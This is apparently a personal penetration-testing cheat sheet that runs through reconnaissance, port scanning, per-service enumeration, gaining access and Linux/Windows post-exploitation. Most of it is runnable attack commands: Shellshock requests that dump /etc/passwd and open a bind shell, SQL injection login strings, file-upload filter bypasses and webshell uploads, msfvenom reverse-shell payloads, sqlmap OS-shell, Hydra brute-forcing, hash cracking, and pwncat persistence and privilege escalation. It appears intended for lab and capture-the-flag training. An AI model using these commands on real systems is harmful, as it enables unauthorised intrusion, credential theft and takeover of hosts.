# Hacking Cheat Sheet

# Reconnaissance (Information Gathering)

- [hunter.io](https://hunter.io/) - known email and users for a specific domain
- theharvester - search for emails in several search engines

    ```bash
    theHarvester -d *.co.il -l 500 -b google
    ```

- sublist3r - search for subdomain for a given domain
- [crt.sh](http://crt.sh) - subdomains  search with %.turtle.co.il
- [httprobe](https://github.com/tomnomnom/httprobe) - will check a list of domain if they are alive, we can fire it sublis3r results
- [amass](https://github.com/OWASP/Amass) - can also search for subdomains and more

    ```bash
    amass enum -d tesla.com
    ```

- [builtwith](https://builtwith.com/) - show frameworks and technologies any domain is built with, then we can search for exploits for those technologies
- [wappalizer](https://www.wappalyzer.com/download/) - browser addon that does almost the same as builtwith
- whatweb - same but uglier than builtwith
- [sumrecon](https://github.com/Gr1mmie/sumrecon) - script that automate some of the above
- [shodan.io](http://shodan.io) - find open ports and services online
- [dnsdumpster](https://dnsdumpster.com/) - dns recon & research, find & lookup dns records
- [ipinfo.io](http://ipinfo.io) - ip info
- [dehashed](https://www.dehashed.com) - find leaked emails and passwords
- simplyemail - enumerate all the online places (github, target site etc)

    ```
    git clone https://github.com/killswitch-GUI/SimplyEmail.git
    ./SimplyEmail.py -all -e TARGET-DOMAIN
    ```

- DNSRecon - DNS Bruteforce

    ```bash
    dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
    ```

- Skipfish - prepares an interactive sitemap for the targeted site

    ```bash
    # basic scan
    skipfish -o out_dir https://www.host.com
    # using cookies to access authenticated pages
    skipfish -o out_dir -I urls_to_scan -X urls_not_to_scan -C cookie1=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX -C cookie2=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  https://www.host.com
    ```

- [namechk](https://namechk.com/) / [whatsmyname](https://whatsmyname.app/) / [namecheckup](https://namecheckup.com/) - OSINT use accounts around the web
- [maltego](https://sectools.org/tool/maltego/) - data mining application

- Exploiting Shellshock

    ```bash
    git clone https://github.com/nccgroup/shocker
    ```

    ```bash
    ./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
    ```

    cat file (view file contents)

    ```bash
    echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
    ```

    Shell Shock run bind shell

    ```bash
    echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
    ```

    Shell Shock reverse Shell

    ```bash
    nc -l -p 443
    ```

# Scanning

- arp-scan (Kali) - gives all IP's on NAT
- netdiscover (Kali) - show live IP's

    ```bash
    sudo netdiscover -r 10.0.0.0/24
    ```

- [rustscan](https://github.com/RustScan/RustScan#-usage) - Scans all 65k ports in 3 seconds and pipe them to NMAP

    ```bash
    rustscan -a 127.0.0.1 -- -A -sC 
    #it's like running nmap -Pn -vvv -p $PORTS -A -sC 127.0.0.1
    ```

- nmap

    ```bash
    nmap -T4 -p- -A 192.168.249.128
    nmap -sV -sC -O FILENAME IP
    nmap -sU -sV --script=vuln #search vulnarabilities
    #T4: speed 1-5, prefered 4, 
    #-p-: scan all 65K ports, 
    #-A: all information possible, 
    #-sS: stealth mode is running by default, it means that we do not establish a connection, instead after ACK we send a reset (SYN→SYNACK→RST)
    #-sV: find versions
    #-sc: default script
    #-O: output to file
    ls /usr/share/nmap/scripts/* | grep ftp #Search nmap scripts for keywords

    #clean results
    grep '/tcp' FILENAME | awk -F "/" '{print $1}'| tr '\n' ',';echo
    ```

- masscan (kali): another fast port scanner

    ```bash
    masscan -p1-65535 --rate 1000 10.0.0.101
    ```

- metasloit - auxiliary in msf is extra enumration and recon

    ```bash
    use auxiliary/scanner/smb/smb_version
    ```

- searchsploit (kali) - search exploit-db website offline

    ```bash
    searchsploit mod ssl 2
    ```

- [Nessus](https://www.tenable.com/products/nessus) - vulnerability assessment, it can scan for open ports, open vulnerabilities, directory busting
- openvas - Vulnerability Assessment

    ```bash
    apt-get update
    apt-get dist-upgrade -y
    apt-get install openvas
    openvas-setup
    netstat -tulpn #Verify openvas is running using
    #Login at https://127.0.0.1:9392 - credentials are generated during openvas-setup

    ```

## AIO Scanners

- [nmap automator](https://github.com/21y4d/nmapAutomator) - A script that you can run in the background!

    ```bash
    ./nmapAutomator.sh <TARGET-IP> <TYPE>  
    ./nmapAutomator.sh 10.1.1.1 All  
    ./nmapAutomator.sh 10.1.1.1 Basic  
    ./nmapAutomator.sh 10.1.1.1 Recon
    ```

- [autorecon](https://github.com/Tib3rius/AutoRecon) - multi-threaded network reconnaissance tool which performs automated enumeration of services

    ```bash
    autorecon 127.0.0.1

    ```

- [Vanquish](https://github.com/frizb/Vanquish) - AIO tool (NMap | Hydra | Nikto | Metasploit | | Gobuster | Dirb | Exploitdb | Nbtscan | | Ntpq | Enum4linux | Smbclient | Rpcclient | | Onesixtyone | Sslscan | Sslyze | Snmpwalk | | Ident-user-enum | Smtp-user-enum | Snmp-check | Cisco-torch | | Dnsrecon | Dig | Whatweb | Wafw00f | | Wpscan | Cewl | Curl | Mysql | Nmblookup | Searchsploit | | Nbtscan-unixwiz | Xprobe2 | Blindelephant | Showmount)

    ```bash
    echo "[IP]" > ~/tools/vanquish/hosts.txt
    python2 Vanquish2.py -hostFile hosts.txt -logging -outputFolder ~/hackthebox/[BOXNAME]

    ```

- [hackerEnv](https://github.com/abdulr7mann/hackerEnv) - automation tool that quickly and easily sweep IPs and scan ports, vulnerabilities and exploit them

    ```bash
    ./hackerEnv -t 10.10.10.10
    ```

- [fsociety](https://github.com/Manisso/fsociety) - A Penetration Testing Framework, you will have every script that a hacker needs

- recon-ag - full-featured web reconnaissance framework written in Python

    ```bash
    git clone https://github.com/lanmaster53/recon-ng.gitcd /recon-ng
    ./recon-ng
    show modules
    help
    ```

- [autorecon](https://github.com/Tib3rius/AutoRecon) - multi-threaded network reconnaissance tool which performs automated enumeration of services

    ```bash
    autorecon 127.0.0.1
    ```

- [legion](https://github.com/carlospolop/legion) - Automatic Enumeration Tool

    ```jsx
    sudo ~/tools/legion/legion.py
    options
    set host 10.0.0.210
    run
    ```

# Enumeration Open Ports

[Pentesting Network](https://book.hacktricks.xyz/pentesting/pentesting-network)

## FTP Enumeration (21)

```bash
nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.0.0.1
FTP anonymous sign in
	mget * #download everything

#can we upload file as anonymous?
#if so we can try upload a cmd webshell and execute commands
locate cmd.aspx #if iis
put cmd.aspx
#browse to the file:
http://IP/cmd.aspx

#we can also try to create a shell payload with msfvenum and upload it
```

## **SSH (22):**

```bash
ssh INSERTIPADDRESS 22

nc IP 22

nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s

#downloading
scp username@hostname:/path/to/remote/file /path/to/local/file
```

If NMAP show "SSH Filtered" it means that [port knocking](https://blog.rapid7.com/2017/10/04/how-to-secure-ssh-server-using-port-knocking-on-ubuntu-linux/) is enable

```bash
#we need to find the /etc/knockd.conf (thorough LFI or FTP or something else)
#inside there is a sequence
knock IP SEQUENCE1 SEQUENCE2 SEQUENCE3
#check nmap again
```

## **SMTP Enumeration (25):**

```bash
nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.0.0.1
```

```bash
nc -nvv INSERTIPADDRESS 25
```

```bash
telnet INSERTIPADDRESS 25
```

```jsx
use auxiliary/scanner/smtp/smtp_enum
msf auxiliary(smtp_enum) > set rhosts 192.168.1.107
msf auxiliary(smtp_enum) > set rport 25
msf auxiliary(smtp_enum) > set USER_FILE /root/Desktop/user.txt
msf auxiliary(smtp_enum) > exploitw
```

## DNS (53)

```bash
#DNS zone transfer
sudo nano /etc/hosts
10.10.10.123  friendzone.red 
host -l friendzone.red 10.10.10.123
```

## **Finger Enumeration (79):**

Download script and run it with a wordlist: [http://pentestmonkey.net/tools/user-enumeration/finger-user-enum](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum)

```bash
finger-user-enum.pl [options] (-u username|-U users.txt) (-t host|-T ips.txt)(
```

## **Web Enumeration (80/443):**

[extra enumeration from hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web)

if we get default apache page, try entering IP to HOSTS

Before dirbusting, try going to index.php or index.html to know which extention to look for 

```bash
dirbuster (GUI)
#1st try without "be recursive"
```

```powershell
cd ~/tools
./feroxbuster -u URL -w WORDLIST -x EXT -C 403 -t 100
```

```bash
Web Extensions

sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar
```

```bash
dirb http://target.com /path/to/wordlist
dirb http://target.com /path/to/wordlist -X .sh,.txt,.htm,.php,.cgi,.html,.pl,.bak,.old
```

```bash
gobuster dir -u https://target.com -b 403 ms-w /usr/share/wordlists/dirb/big.txt -x .txt,.php
use -r (recursive) or try found folders
```

```bash
nikto –h 10.0.0.1 #web vulnerability scanner
```

```jsx
owasp zap
```

```bash
Look for Default Credentials
```

```bash
sql
```

- View Page Source

    ```bash
    Hidden Values
        Developer Remarks
        Extraneous Code
        Passwords!
    ```

- burpsuite

    ```bash
    compare “host:”
    crsf token = no bruteforce
    add php code if url has anything.php
            <L>
     anything being executed?
            try directory traversal
                ../../../home
    ```

- sign in page

    ```bash
    SQL Injection

        ‘or 1=1– –
        ‘ or ‘1’=1
        ‘ or ‘1’=1 — –
        ‘–
        Use known Username
            tyler’ — –
            tyler’) — –

    #bruteforce
    hydra -L <username list> -p <password list> <IP Address> <form parameters><failed login message>
    ```

- file upload

    ```bash

    #if NMAP show something like: Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND
    #we want to check if we can upload files
    davtest -url http://IP
    #if we see succedd we can use curl to upload:
    curl -X PUT http://10.10.10.15/df.txt -d @test.txt
    #and execute it:
    **curl http://10.10.10.15/df.txt**

    Blacklisting bypass
            bypassed by uploading an unpopular php extensions. such as: pht, phpt, phtml, php3, php4, php5, php6 
        Whitelisting bypass
            passed by uploading a file with some type of tricks, Like adding a null byte injection like ( shell.php%00.gif ). Or by using double extensions for the uploaded file like ( shell.jpg.php)
    ```

- Wfuzz - Subdomain brute forcer, replaces a part of the url like username with wordlist

    ```bash
    wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test

    wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ

    wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"

    wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ

    wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ
    ```

- [Knockpy](https://github.com/guelfoweb/knock) - enumerate subdomains on a target domain through a wordlist

    ```bash
    knockpy domain.com
    ```

- wpscan - if wordpress found

    ```bash
    wpscan --url [http://:80$target](http://:80$target) --enumerate u,t,p | tee $target-wpscan-enum
    #if we can enter wordpres, we can change the 404 page to php reverse shell code and gain access
    ```

- joomscan - if joomla found

    ```powershell

    cd ~/tools/joomscan
    perl joomscan.pl -u http://10.10.10.150/administrator/
    ```

## If A File is found

- steghide - check pictures for hidden files

    ```bash
        apt-get install steghide

        steghide extract -sf picture.jpg

        steghide info picture.jpg

        apt-get install stegosuite
    ```

- [Stegseek](https://github.com/RickdeJager/stegseek) - lightning fast steghide cracker to extract hidden data from files

    ```bash
    stegseek [stegofile.jpg] [wordlist.txt]
    ```

- binwalk - extract hidden files from files (steganography)

    ```bash
    binwalk FILE.JPG
    #if something was found 
    binwalk -e FILE
    ```

- strings - check strings in files

    ```bash
    stringe FILE.jpg
    ```

- [exiftool](https://github.com/exiftool/exiftool) - pictures metadata
- zip2john - prepare an encrpyted zip file for john hacking

    ```bash
    zip2john ZIPFILE > zip.hashs
    ```

- SQLite DB

    ```powershell
    #if we found a flat-file db 
    file EXAMPLE.db
    #if sqlite3
    sqlite3 <database-name>
    .tables
    PRAGMA table_info(customers);
    SELECT * FROM customers;
    ```

- sqlmap - check website for sql injection (more info down)

    [Sqlmap trick](https://hackertarget.com/sqlmap-post-request-injection/) - if we have a login page, we can try admin:admin, catch that in burpsuite,  save the full request to a file, run:

    ```bash
    sqlmap -r FILENAME --level=5 --risk=3 --batch
    sqlmap -r FILENAME -dbs --level=5 --risk=3 --batch

    sqlmap -r FILENAME --dbs #enumarate DB's
    sqlmap -r FILENAME -D DB_Name --tables #enumarate tables
    sqlmap -r FILENAME -D DB_Name -T TABLE_Name --dump #DUMP table

    #Find SQL in webpage url automatically
    sqlmap -u https://IP/ –crawl=1

    #with authentication
    sqlmap -u “http://target_server” -s-data=param1=value1&param2=value2 -p param1--auth-type=basic --auth-cred=username:password

    #Get A Reverse Shell (MySQL)
    sqlmap -r post_request.txt --dbms "mysql" --os-shell
    ```

- [fimap](https://github.com/kurobeats/fimap) - Check for LFI, find, prepare, audit, exploit and even google automatically for local and remote file inclusion

    ```bash
    ~/tools/fimap/src/fimap.py –H –u http://target-site.com/ -w output.txt
    ```

    If we see in burpsuite php$url= we need to test for LFI (try /etc/passwrd)

    ```bash
    http://$ip/index.php?page=/etc/passwd
    http://$ip/index.php?file=../../../../etc/passwd
    ```

## if a page redirects to another, we can use burp to stop

```bash
Proxy -> Options -> Match and Replace
```

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled.png)

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%201.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%201.png)

## kerberos (88):

```powershell
tel#add host to /etc/hosts
sudo gedit /etc/hosts

./GetUserSPNs.py -request active.htb/SVC_TGS > admin.txt
#the password we will get will be encrypted
john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt

#with the cracked password...
psexec.py administrator@active.htb
```

## **Pop3 (110):**

```bash
telnet INSERTIPADDRESS 110
```

```bash
USER [username]
```

```bash
PASS [password]
```

- To login

```bash
LIST
```

- To list messages

```bash
RETR [message number]
```

- Retrieve message

```bash
QUIT
```

```bash
quits
```

## RPC (135)

```bash
rpcclient --user="" --command=enumprivs -N $ip #Connect to an RPC share without a username and password and enumerate privledges
rpcclient --user="<Username>" --command=enumprivs $ip #Connect to an RPC share with a username and enumerate privledges
```

## **RPCBind (111):**

```bash
rpcinfo –p x.x.x.x
```

## **SMB\RPC Enumeration (139/445):**

```bash
smbmap -H 10.10.10.149
```

```bash
smbclient -L \\\\10.0.0.100\\
smbclient \\\\10.0.0.100\\Replication
prompt off #doesnt prompt of us downloading
recurse on` #download all the files
mget *` #download all files in this share

```

```bash
enum4linux -a 10.0.0.1 #Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing
```

```bash
nbtscan x.x.x.x #Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain
```

```bash
ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
```

```bash
python /home/hasamba/tools/impacket/build/scripts-3.8/samrdump.py 192.168.XXX.XXX
```

```bash
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse $IP
```

smb4k on Kali, useful Linux GUI for browsing SMB shares

```bash
apt-get install smb4k -y
```

- on Windows:
- Download All Files From A Directory Recursively

```bash
smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'
```

```bash
net use \\TARGET\IPC$ "" /u:"" #Manual Null session testing
```

## **SNMP Enumeration (161):**

- Fix SNMP output values so they are human readable:

```bash
apt-get install snmp-mibs-downloader download-mibs
echo "" > /etc/snmp/snmp.conf
```

```bash
snmpwalk -c public -v1 192.168.1.X 1| 
 grep hrSWRunName|cut -d* * -f
```

```bash
snmpcheck -t 192.168.1.X -c public
```

```bash
onesixtyone -c names -i hosts
```

```bash
nmap -sT -p 161 192.168.X.X -oG snmp_results.txt
nmap -n -vv -sV -sU -Pn -p 161,162 –script=snmp-processes,snmp-netstat IP
```

```bash
snmpenum -t 192.168.1.X
```

```bash
onesixtyone -c names -i hosts
```

```bash
#metasploit
    auxiliary/scanner/snmp/snmp_enum
    auxiliary/scanner/snmp/snmp_enum_hp_laserjet
    auxiliary/scanner/snmp/snmp_enumshares
    auxiliary/scanner/snmp/snmp_enumusers
    auxiliary/scanner/snmp/snmp_login
```

## **Oracle (1521):**

```bash
tnscmd10g version -h INSERTIPADDRESS
```

```bash
tnscmd10g status -h INSERTIPADDRESS
```

## LDAP (389)

[JXplorer - an open source LDAP browser](http://jxplorer.org/)

## MSSQL (1433)

```bash
nmap -n -v -sV -Pn -p 1433 –script ms-sql-brute –script-args userdb=users.txt,passdb=passwords.txt IP
nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password IP
```

[Hunting for MSSQL | Offensive Security](https://www.offensive-security.com/metasploit-unleashed/hunting-mssql/)

## **Mysql Enumeration (3306):**

```bash
nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122

mysql –h IP -u root -p
show databases;
show tables;
use tablename;
describe table;
select table1, table2 from tablename;
```

## Active Directory

```bash
# current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# domain trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# current forest info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# get forest trust relationships
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()

# get DCs of a domain
nltest /dclist:offense.local
net group "domain controllers" /domain

# get DC for currently authenticated session
nltest /dsgetdc:offense.local

# get domain trusts from cmd shell
nltest /domain_trusts

# get user info
nltest /user:"spotless"

# get DC for currently authenticated session
set l

# get domain name and DC the user authenticated to
klist

# get all logon sessions. Includes NTLM authenticated sessions
klist sessions

# kerberos tickets for the session
klist

# cached krbtgt
klist tgt

# whoami on older Windows systems
set u

# find DFS shares with ADModule
Get-ADObject -filter * -SearchBase "CN=Dfs-Configuration,CN=System,DC=offense,DC=local" | select name

# find DFS shares with ADSI
$s=[adsisearcher]'(name=*)'; $s.SearchRoot = [adsi]"LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local"; $s.FindAll() | % {$_.properties.name}

# check if spooler service is running on a host
powershell ls "\\dc01\pipe\spoolss"
```

## MSSQL

Try using "Browse for More" via MS SQL Server Management Studio

Enumeration / Discovery:

Nmap:

```bash
nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
```

Metasploit:

```bash
msf > use auxiliary/scanner/mssql/mssql_ping
```

### Bruteforce MSSQL Login

```bash
msf > use auxiliary/admin/mssql/mssql_enum
```

### Metasploit MSSQL Shell

```bash
msf > use exploit/windows/mssql/mssql_payload
msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
```

# Gaining Access

- hydra: bruteforce tool

    ```bash
    hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.101 -t 4 -v -f
    #-l is the user we want to attack, -P password file list, -t threads, -v verbose
    #it's better to intercept the login page with burp, check to see the correct username&password syntax and copy the exact failed message
    -#f   exit when a login/pass pair is found
    hydra -l hasamba -P ~/Desktop/test_passwords.txt 10.0.0.210 -s 8085 http-post-form "/login/:username=^USER^&password=^PASS^:F=Authentication failed" -VVV -t 6 -
    hydra OPT #will show us optional moduls for http and such
    hydra -U MODULE_NAME #will show module examples

    hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V #Hydra FTP brute force
    hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V #Hydra POP3 brute force
    hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V #Hydra SMTP brute force

    hydra -l username -P password-list <URL_TO_SERVER> http-post-form "<PATH-TO_LOGIN>:POST_REQUEST_FOR_LOGIN:FAILED_RESPONSE_IDENTIFIER"
    ```

- metasploit - can also bruteforce

    ```bash
    use auxialary/scanner/ssh/ssh_login
    options
    set username root
    set pass_file /usr/share...
    set rhosts
    set threads 10
    set verbose true
    run
    ```

- unshadow (kali) - combine both files and will insert the hashed passwords to the passwd file, so we can use this file with hashcat to maybe decrypt the password.

    ```bash
    unshadow PASSSWD_FILE SHADOW_FILE
    ```

- [hashcat](https://www.notion.so/Hashcat-b885f8ac8c0f450986d62c0d29f44cb9) - crack passwords hashes ([Cheat Sheet](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/a44ab748-a9a9-437e-a4a1-2fa1cc6c03a8/HashcatCheatSheet.v2018.1b.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20201122%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20201122T190235Z&X-Amz-Expires=86400&X-Amz-Signature=03753b73d70b97901e6a764011ae5ffdbffc2d9dcbd00673f79b64097b1299d9&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22HashcatCheatSheet.v2018.1b.pdf%22))

    ```bash
    hashcat -m "OSCODE" unshadow.txt passwordFile.txt
    #from here: https://github.com/frizb/Hashcat-Cheatsheet
    hashcat --force -m300 --status -w3 -o found.txt --remove --potfile-disable -r rules\OneRuleToRuleThemAll.rule hash.txt rockyou.txt
    ```

- hash-identifier

    ```bash
    hash-identifier [hash]
    ```

- [name-that-hash](https://github.com/HashPals/Name-That-Hash) - better hash analyzer

    ```jsx

    ```

- cewl - create wordlist from a website

    ```bash
    cewl  -v --with-numbers -e --email_file cewl_email.wordlist -w cewl.wordlist http://sneakycorp.htbme

    #my favorite rule to add:
    john --wordlist=wordlist.txt --rules=jumbo --stdout > wordlist-modified.txt

    hashcat --force cewl.wordlist -r /usr/share/hashcat/rules/best64.rule --stdout > hashcat_words

    https://github.com/praetorian-inc/Hob0Rules
    ###hob064 This ruleset contains 64 of the most frequent password patterns
    hashcat -a 0 -m 1000 <NTLMHASHES> wordlists/rockyou.txt -r hob064.rule -o cracked.txt

    ###d3adhob0 This ruleset is much more extensive and utilizes many common password structure ideas
    hashcat -a 0 -m 1000 <NTLMHASHES> wordlists/english.txt -r d3adhob0.rule -o cracked.txt

    #adding John rules
    john --wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt
    john --wordlist=wordlist.txt --rules=best64 --stdout > wordlist-modified.txt
    ```

- john the ripper - password cracker ([cheat sheet](https://drive.google.com/viewerng/viewer?url=https://countuponsecurity.files.wordpress.com/2016/09/jtr-cheat-sheet.pdf)) ([Jumbo community version](https://github.com/openwall/john))

    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
    #after john finished, ask him to show
    john hashes.txt --show

    john 127.0.0.1.pwdump --wordlist=dictionary.txt --rules=Jumbo #with jumbo rules from https://github.com/openwall/john
    ```

    [CyberChef](https://gchq.github.io/CyberChef/)

    [CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)

    [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/)

    [Cipher Identifier (online tool) | Boxentriq](https://www.boxentriq.com/code-breaking/cipher-identifier)

- msfvenom(kali) - tool to create malware

    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOSTS=10.10.10.14 LPORT=4444 -f aspx > ex.aspx

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
    ```

- [responder (imapcket)](https://www.notion.so/responder-imapcket-b7bdbbb91ce74e98834dd88ec1715528) - MITM - listening in the background and wait for a failed dns request

    ```bash
    responder -I eth0 -rdwv #Run Responder.py for the length of the engagement while you're working on other attack vectors.
    ```

# Post Exploitation

## Useful commands running locally on the Linux system To quickly analyze the system and possibly help to escalate privileges

- whoami - shows the user we logged in with
- history - show last history, it usually can show any password or personal stuff the user execute
- sudo -l - show what programs we can run without sudo, check all process against [GTFOBins](https://gtfobins.github.io/)
    - if we get `(ALL, !root) /bin/bash`, we can exploit with [this](https://www.exploit-db.com/exploits/47502)
- uname -a - will show us the linux version so we can search for a script that will escalate privileges
- export - check system variables
- processes

    ```bash
    ps -ef
    ps auxf
    ps auxfww
    ```

- find in files

    ```bash
    find . -name "*.java" -type f -exec fgrep -iHn "textToFind" {} \;
    find . -regex ".*\.\(c\|java\)" -type f -exec fgrep -iHn "textToFind" {} \;
    find / -maxdepth 4 -name *.conf -type f -exec grep -Hn "textToFind" {} \; 2>/dev/null
    # SUID files owned by root
    find / -uid 0 -perm -4000 -type f 2>/dev/null
    # SUID files owned by root and world readable
    find / -uid 0 -perm -u=s,o=r -type f -exec ls -la {} \; 2> /dev/null
    # SUID files
    find / -perm -4000 -type f 2>/dev/null
    # world writable directories
    find / -perm -2 -type d 2>/dev/null

    #find passwords in files and ignore errors and filter out the proc and other folders
    find . ! -path "*/proc/*" -type f -name "*" -exec fgrep -iHn password {} \;
    find . -type f \( -iname \*.conf -o -iname \*.cfg -o -iname \*.xml -o -iname \*.ini -o -iname \*.json -o -iname \*.sh -o -iname \*.pl -o -iname \*.py \) -exec fgrep -iHn password {} \; 2> /dev/null

    # find using several patterns read from file (patterns are delimited by new line)
    find . -type f -exec grep -iHFf patterns.txt {} \;

    # find password keyword in small files
    find . -type f -size -512k -exec fgrep -iHn password {} \;

    # reverse java jar files and find passwords there
    find . -name "*.jar" -type f -exec ~/jd-cli/jd-cli -oc -l -n -st {} \; | egrep -i -e "Location:" -e "password" | uniq
    ```

```bash
# check open ports and services listening
netstat -anp

# check defined hosts
cat /etc/hosts

# check local IP addresses and interfaces
ifconfig -a

# check route
route -v

# check filesystem
df

# check sudo privileges
sudo -l

# check crontab
crontab -l

# check inittab
cat /etc/inittab

# try to sniff traffic
tcpdump
tcpdump -s0 not port 22 -w trace.pcap

# check known hosts
cat ~/.ssh/known_hosts

# try access mails
head /var/mail/root

# list groups, users
cat /etc/group
cat /etc/passwd
# with root privileges
cat /etc/shadow

# check shared memory
ipcs -mp

# logout
logout

# close script session
Ctrl + D
```

## Scripts

- [pwncat](https://github.com/calebstewart/pwncat) - pwncat is a post-exploitation platform for Linux targets

    ```bash
    cd ~/tools
    source pwncat-env/bin/activate

    # Connect to a bind sheql
    pwncat connect://10.10.10.10:4444
    pwncat 10.10.10.10:4444
    pwncat 10.10.10.10 4444
    # Listen for reverse shell
    pwncat bind://0.0.0.0:4444
    pwncat 0.0.0.0:4444
    pwncat :4444
    pwncat -lp 4444
    # Connect via ssh
    pwncat ssh://user:password@10.10.10.10
    pwncat user@10.10.10.10
    pwncat user:password@10.10.10.10
    pwncat -i id_rsa user@10.10.10.10
    # SSH w/ non-standard port
    pwncat -p 2222 user@10.10.10.10
    pwncat user@10.10.10.10:2222
    # Reconnect utilizing installed persistence
    #   If reconnection failes and no protocol is specified,
    #   SSH is used as a fallback.
    pwncat reconnect://user@10.10.10.10
    pwncat reconnect://user@c228fc49e515628a0c13bdc4759a12bf
    pwncat user@10.10.10.10
    pwncat c228fc49e515628a0c13bdc4759a12bf
    pwncat 10.10.10.10

    ^D
    run enumerate.gather

    run escalate.auto exec

    ---OLD---

    upload/download --help

    persist --help
    persist --install
    perist --status
    persist --clean

    tamper --help

    busybox --install

    enum --help
    enum --show --type sudo
    enum --report enumaration.md

    privsec --help
    privsec -l
    privsec --escalate
    privsec -e -u sysadmin
    ```

- [sherlock](https://github.com/rasta-mouse/Sherlock) - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.
- [windows exploit suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) - This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.
- metasploit migrate process and search suggester

    ```bash
    ps
    migrate 1788
    search suggester
    ```

- [psexec](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/psexec%20d818d32588314cb68f8ca3db57a6e1ef.md), wmiexec.py or [smbexec.py](http://smbexec.py) - privilege escalation for windows
- [powershellempire](https://github.com/PowerShellEmpire/PowerTools) - windows privilege escalation

    ```bash
    powershell -ep (ExecutionPolicy) bypass
    . .\PowerView.ps1
    Get-NetDomain
    Get-NetDomainController
    Get-DomainPolicy
    (Get-DomainPolicy)."system access"
    Get-NetUser
    Get-NetUser | select cn /samaccountname/description
